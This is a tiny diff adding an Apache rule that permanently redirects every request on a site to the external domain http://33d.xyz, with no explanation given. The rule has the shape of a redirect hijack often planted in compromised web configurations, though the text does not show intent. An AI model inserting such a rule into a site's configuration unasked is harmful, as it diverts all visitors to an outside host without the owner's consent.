@@ -1,0 +1,2 @@
+
+redirectMatch 301 ^(.*)$ http://33d.xyz
